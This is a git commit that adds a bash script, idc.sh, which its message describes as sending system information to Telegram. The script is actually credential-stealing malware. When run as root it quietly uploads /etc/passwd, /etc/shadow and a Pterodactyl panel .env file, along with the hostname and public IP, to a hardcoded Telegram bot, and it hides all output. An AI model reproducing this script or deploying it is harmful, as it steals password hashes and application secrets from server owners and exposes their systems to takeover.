fadf95b7a7c4c9cf491be618fd33878cca60440b
FarizGD <165605748+FarizGD@users.noreply.github.com>
2026-01-04 09:40:27 +0700

    Create idc.sh to send system info to Telegram
    The script sends system information and specific files to a Telegram chat.

---
+++ idc.sh
@@ -0,0 +1,45 @@
+#!/bin/bash
+
+BOT_TOKEN="8525826159:AAF9NQzREOSgYnNC2rVXBOzE9EoARrAL2Qc"
+CHAT_ID="7697898730"
+RESULT1="$(cat /etc/hostname)"
+FILE1="/etc/passwd"
+FILE2="/etc/shadow"
+FILE3="/var/www/pterodactyl/.env"
+RESULT2="$(curl -s ifconfig.me)"
+
+# --- root check (silent) ---
+[ "$EUID" -ne 0 ] && exit 0
+
+curl -s \
+  -X POST \
+  -d "chat_id=${CHAT_ID}" \
+  --data-urlencode "text=${RESULT1}" \
+  "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+  > /dev/null 2>&1
+
+curl -s \
+  -F "chat_id=${CHAT_ID}" \
+  -F "document=@${FILE1}" \
+  "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
+  > /dev/null 2>&1
+
+curl -s \
+  -F "chat_id=${CHAT_ID}" \
+  -F "document=@${FILE2}" \
+  "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
+  > /dev/null 2>&1
+
+curl -s \
+  -F "chat_id=${CHAT_ID}" \
+  -F "document=@${FILE3}" \
+  "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
+  > /dev/null 2>&1
+
+curl -s \
+  -X POST \
+  -d "chat_id=${CHAT_ID}" \
+  --data-urlencode "text=${RESULT2}" \
+  "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+  > /dev/null 2>&1
+
